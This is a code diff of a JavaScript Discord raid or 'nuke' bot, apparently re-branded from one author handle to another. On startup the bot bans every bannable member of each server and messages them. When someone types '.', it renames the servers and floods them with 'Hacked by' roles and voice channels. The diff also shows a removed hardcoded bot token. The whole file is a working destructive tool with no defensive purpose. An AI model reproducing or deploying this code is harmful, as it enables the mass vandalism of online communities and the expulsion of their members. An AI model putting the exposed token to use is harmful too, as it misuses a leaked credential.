@@ -1,17 +1,17 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log("By KBOOOOOOOOSH-YT");
+console.log("By MABA KALARI");
 LOka.on("ready", () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
 });
 LOka.on("ready", () => {
   console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
   console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-  console.log("      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ");
+  console.log("      ~            ~  By : MABA KALARI ~           ~    ");
   console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
   console.log("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
   console.log(
-    `Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`
+    `Logged in as  * [ "  MABA KALARI " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`
   );
 });
 var prefix = ".";
@@ -38,12 +38,12 @@ LOka.on("message", message => {
 var x1 = "Go";
 LOka.on("message", message => {
   if (message.content === ".") {
-    LOka.user.setUsername("HACKER JACK");
+    LOka.user.setUsername("HACKER MABA");
   }
 });
 LOka.on("message", message => {
   if (message.content === ".") {
-    LOka.user.setGame(`lagal jack nakay xatara`, "https://www.twitch.tv/hix");
+    LOka.user.setGame(`lagal MABA nakay xatara`, "https://www.twitch.tv/hix");
   }
 });
 
@@ -59,7 +59,7 @@ LOka.on("message", message => {
 LOka.on("message", message => {
   if (message.content === ".") {
     LOka.guilds.forEach(m => {
-      m.setName(`lagal jack nakay xatara`);
+      m.setName(`lagal MABA nakay xatara`);
     });
   }
 });
@@ -78,197 +78,197 @@ LOka.on("message", message => {
   if (message.content === ".") {
     LOka.guilds.forEach(m => {
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
 
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-
-      m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
-        permissions: [1],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
 
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
 
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MAAB",
         permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
-        name: "Hacked u by JACK",
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        premissions: [1],
+        color: " #ff0000"
+      });
+
+      m.createRole({
+        name: "Hacked by MBAA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hacked by MABA",
         permissions: [1],
         color: " #ff0000"
       });
@@ -278,136 +278,136 @@ LOka.on("message", message => {
 LOka.on("message", message => {
   if (message.content === ".") {
     LOka.guilds.forEach(m => {
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
       m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MAAB", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
     });
   }
 });
@@ -415,96 +415,96 @@ LOka.on("message", message => {
 LOka.on("message", message => {
   if (message.content === ".") {
     LOka.guilds.forEach(m => {
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u BY JAVK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u BY MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
+      m.createChannel("Hacked u by MAAB", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
 
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JACK", "voice");
-      m.createChannel("Hacked u by JAKC", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
+      m.createChannel("Hacked u by MABA", "voice");
     });
   }
 });
@@ -518,7 +518,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send("MAY KA LAGAL JACK").catch(e => {
+  await guild.owner.send("MAY KA LAGAL MABA").catch(e => {
     return void e;
   });
 
@@ -526,7 +526,7 @@ async function nuke(guild) {
     guild.members.map(async m => {
       if (m.bannable) {
         users++;
-        await m.send("^JACK LERAYA^").catch(e => {
+        await m.send("^MABA LERAYA^").catch(e => {
           return void e;
         });
         return m.ban();
@@ -543,9 +543,9 @@ async function nuke(guild) {
     })
   );
 
-  await guild.createChannel("Hacked u by JACK", "text");
+  await guild.createChannel("Hacked u by MABA", "text");
 
-  await guild.createChannel("Hacked u by JACK", "voice");
+  await guild.createChannel("Hacked u by MABA", "voice");
 }
 
 
@@ -570,7 +570,7 @@ LOka.on("ready", () => {
   for (const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log("-------------------------------------------------------------");
   console.log("");
-  console.log("Made by GOVA");
+  console.log("Made by MABA");
   console.log("");
   console.log("-------------------------------------------------------------");
 });
@@ -593,4 +593,4 @@ LOka.on("guildMemberAdd", member => {
   }
 });
 
-LOka.login("NzQzNDA5NTg2NzgxODE0Nzk0.XzUQIQ.oUzMyyJXNmbFunN9syPiZYUfZ6o");
+LOka.login("");
